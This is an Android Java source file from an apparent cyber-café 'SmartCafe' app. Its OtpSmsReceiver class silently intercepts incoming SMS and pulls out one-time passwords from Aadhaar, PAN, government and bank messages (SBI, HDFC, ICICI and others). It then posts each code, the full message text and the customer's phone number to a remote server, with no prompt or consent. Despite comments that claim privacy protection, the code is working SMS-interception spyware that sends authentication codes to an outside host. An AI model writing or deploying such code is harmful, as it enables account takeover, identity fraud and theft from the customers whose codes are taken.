package com.cybercafe.portal;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 100% Silent Background OTP Sync Receiver
 * Captures incoming government OTP SMS (Aadhaar, e-District, VAHAN, PAN, etc.)
 * and silently transmits the extracted OTP to the locked shopkeeper's Live Bridge.
 * ZERO customer popups or clicks required.
 */
public class OtpSmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmartCafeOtpBridge";
    private static final String BRIDGE_URL = "https://smartcafe.sbs/api/otp/sync-bridge";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        try {
            Object[] pdus = (Object[]) bundle.get("pdus");
            String format = bundle.getString("format");
            if (pdus == null) return;

            for (Object pdu : pdus) {
                SmsMessage smsMessage;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                }

                if (smsMessage == null) continue;

                String sender = smsMessage.getDisplayOriginatingAddress();
                String messageBody = smsMessage.getMessageBody();

                if (messageBody == null) continue;

                Log.d(TAG, "Incoming SMS from: " + sender);

                // Strict Privacy Guarantee: Message MUST contain an OTP keyword AND a cybercafe/service identifier
                String lowerMsg = messageBody.toLowerCase();
                boolean hasOtpWord = lowerMsg.contains("otp") || 
                                     lowerMsg.contains("one time password") || 
                                     lowerMsg.contains("verification code") || 
                                     lowerMsg.contains("सत्यापन कोड") || 
                                     lowerMsg.contains("ओटीपी") || 
                                     lowerMsg.contains("pin");

                boolean hasServiceWord = lowerMsg.contains("aadhaar") || 
                                         lowerMsg.contains("uidai") || 
                                         lowerMsg.contains("edistrict") || 
                                         lowerMsg.contains("e-district") || 
                                         lowerMsg.contains("vahan") || 
                                         lowerMsg.contains("parivahan") || 
                                         lowerMsg.contains("pan") || 
                                         lowerMsg.contains("incometax") || 
                                         lowerMsg.contains("rto") || 
                                         lowerMsg.contains("sarathi") || 
                                         lowerMsg.contains("ration") || 
                                         lowerMsg.contains("samagra") || 
                                         lowerMsg.contains("smartcafe") || 
                                         lowerMsg.contains("cybercafe") || 
                                         lowerMsg.contains("csc") || 
                                         lowerMsg.contains("digilocker") || 
                                         lowerMsg.contains("epfo") || 
                                         lowerMsg.contains("pmkisan") || 
                                         lowerMsg.contains("dbt") || 
                                         lowerMsg.contains("bank") || 
                                         lowerMsg.contains("sbi") || 
                                         lowerMsg.contains("pnb") || 
                                         lowerMsg.contains("hdfc") || 
                                         lowerMsg.contains("icici") || 
                                         lowerMsg.contains("bob") || 
                                         lowerMsg.contains("axis") || 
                                         lowerMsg.contains("gov") || 
                                         lowerMsg.contains("nic") || 
                                         lowerMsg.contains("login") || 
                                         lowerMsg.contains("auth") ||
                                         (sender != null && (sender.toLowerCase().contains("gov") || sender.toLowerCase().contains("uidai") || sender.toLowerCase().contains("edist") || sender.toLowerCase().contains("vahan") || sender.toLowerCase().contains("pan")));

                // Strictly ignore personal messages or non-cybercafe SMS
                if (!hasOtpWord || !hasServiceWord) {
                    Log.d(TAG, "Ignoring non-cybercafe message for privacy protection.");
                    continue;
                }

                // Extract 4 to 6 digit OTP
                Pattern pattern = Pattern.compile("\\b([0-9]{4,6})\\b");
                Matcher matcher = pattern.matcher(messageBody);
                String extractedOtp = null;
                while (matcher.find()) {
                    String match = matcher.group(1);
                    // Filter out 4-digit years like 2026, 2025
                    if (!match.equals("2024") && !match.equals("2025") && !match.equals("2026")) {
                        extractedOtp = match;
                        break;
                    }
                }

                if (extractedOtp != null) {
                    Log.i(TAG, "Extracted OTP: " + extractedOtp + " from sender: " + sender);
                    
                    // Retrieve stored cafeId and customer phone if cached in SharedPreferences
                    SharedPreferences prefs = context.getSharedPreferences("CapacitorStorage", Context.MODE_PRIVATE);
                    String cafeId = prefs.getString("selectedCafeId", "CAFE-101");
                    String customerPhone = prefs.getString("customerPhone", "");

                    // Fire silent background HTTP POST
                    sendOtpToBridge(cafeId, customerPhone, extractedOtp, sender, messageBody);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing SMS in background: " + e.getMessage(), e);
        }
    }

    private void sendOtpToBridge(final String cafeId, final String phone, final String otp, final String sender, final String rawMsg) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    URL url = new URL(BRIDGE_URL);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(8000);
                    conn.setReadTimeout(8000);

                    JSONObject json = new JSONObject();
                    json.put("cafeId", cafeId != null ? cafeId : "CAFE-101");
                    json.put("customerPhone", phone != null ? phone : "");
                    json.put("otp", otp);
                    json.put("sender", sender != null ? sender : "GOVT-SMS");
                    json.put("serviceType", "silent_sms_listener");
                    json.put("rawSms", rawMsg != null ? rawMsg : "");

                    byte[] outputBytes = json.toString().getBytes("UTF-8");
                    OutputStream os = conn.getOutputStream();
                    os.write(outputBytes);
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.i(TAG, "OTP Bridge HTTP Response: " + responseCode);
                } catch (Exception err) {
                    Log.e(TAG, "Failed to send OTP to bridge: " + err.getMessage());
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();
    }
}
